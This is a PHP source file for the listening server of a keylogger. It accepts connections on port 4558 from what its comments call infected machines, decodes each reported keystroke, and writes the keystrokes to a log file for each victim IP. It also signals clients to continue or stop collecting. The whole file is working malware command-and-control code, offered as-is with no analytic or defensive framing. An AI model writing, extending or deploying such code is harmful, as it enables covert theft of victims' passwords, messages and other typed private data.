<?php
/**
 *  @author DeKyll <d3kyll@gmail.com>
 */

declare(ticks = 1);

pcntl_signal(SIGUSR1, 'handle_stop_collecting');
pcntl_signal(SIGINT, 'handle_exit_all');

// Listening to requests on localhost port 4558
$host = "0.0.0.0";
$port = 4558;

$stop = "continue";
$socket = NULL;
$terminate = FALSE;

function handle_stop_collecting(){
    if($GLOBALS["stop"] == "continue"){
        $GLOBALS["stop"] = "end";
    }
}

function handle_exit_all(){
    if($GLOBALS["stop"] == "end"){
    	$GLOBALS["terminate"] = TRUE;
    }
}

// translates a pressed key to text
function translate_input($message_date, $pressed_key){

	// checks if a enter key was pressed to move to next line
	if(strcmp($pressed_key, "Key.enter") === 0){
		return "\n" . $message_date;
	}

	if(strcmp($pressed_key, "Key.space") === 0){
		return " ";
	}

	if(strcmp($pressed_key, "Keylogger ON") === 0){
		return "\n" . $message_date . "[" . $pressed_key . "]";
	}

	// checks if it is an alphabet character or another key pressed
	if($pressed_key[0] === '\''){
		return $pressed_key[1];
	}

	return "[" . $pressed_key . "]";
}

// handles connection and saves received data from infected machine
function handle_connection($client_address, $spawn){

	// creates log folder if it does not exist already or if it was deleted
	if(!file_exists('logs/' . $client_address)){
		mkdir('logs/' . $client_address, 0755, true);
	}
	// open received host log file
	$myfile = fopen("logs/" . $client_address . "/keylogger_" . $client_address . ".txt", "a") or die("Unable to open file\n");
	$myfile_sorted = fopen("logs/" . $client_address . "/keylogger_sorted_" . $client_address . ".txt", "a") or die("Unable to open file\n");

	// reads client message
	$message = socket_read($spawn, 1024) or die("Could not read input\n");
	
	// extracts pressed key and message date from client message
	$pressed_key = substr($message, strpos($message, '>')+2, strlen($message)-1);
	$message_date = substr($message, 0, strpos($message, '>')+2);

	// translates client pressed key to text
	$input = translate_input($message_date, $pressed_key);

	// clear cache to avoid filesize issues
	clearstatcache();

	//saves infected machine reported data
	fwrite($myfile_sorted, $input);
	fwrite($myfile, $message . "\n");

	//closes files
	fclose($myfile);
	fclose($myfile_sorted);
}

function startup(){
	if (!extension_loaded('sockets')) {
		die('The sockets extension is not loaded.');
	}

	// creates log folder if it does not exist already or if it was deleted
	if(!file_exists('logs')){
		mkdir('logs', 0755, true);
	}

	// Not timeout
	set_time_limit(0);

	// create socket
	$GLOBALS["socket"] = socket_create(AF_INET, SOCK_STREAM, 0) or die("Could not create socket\n");
	// sets 1 second of timeout for the socket accepting connections(sending and receiving)
	socket_set_option($GLOBALS["socket"], SOL_SOCKET, SO_RCVTIMEO, array('sec' => 1, 'usec' => 0));
	socket_set_option($GLOBALS["socket"], SOL_SOCKET, SO_SNDTIMEO, array('sec' => 1, 'usec' => 0));
	// binds socket to a port in the local machine
	$result = socket_bind($GLOBALS["socket"], $GLOBALS["host"], $GLOBALS["port"]) or die("Could not bind to socket\n");
	// start listening for connections
	$result = socket_listen($GLOBALS["socket"], 3) or die("Could not set up socket listener\n");	

	while($GLOBALS["terminate"] === FALSE){
		// spawn another socket to handle next communication
		$spawn = @socket_accept($GLOBALS["socket"]);
		if($spawn !== FALSE){
			// gets client IP address and Port
			socket_getpeername($spawn, $client_address, $client_port);

			handle_connection($client_address, $spawn);

			// sends to client a message to continue or stop collecting data
			$output = $GLOBALS["stop"];
			$output = strval(strlen($output)) . "#" . $output . "#";
			socket_write($spawn, $output, strlen($output)) or die("Could not write output\n");

			// close actual connection socket
			socket_close($spawn);
		}
	}

	socket_close($GLOBALS["socket"]);
}

startup();
?>
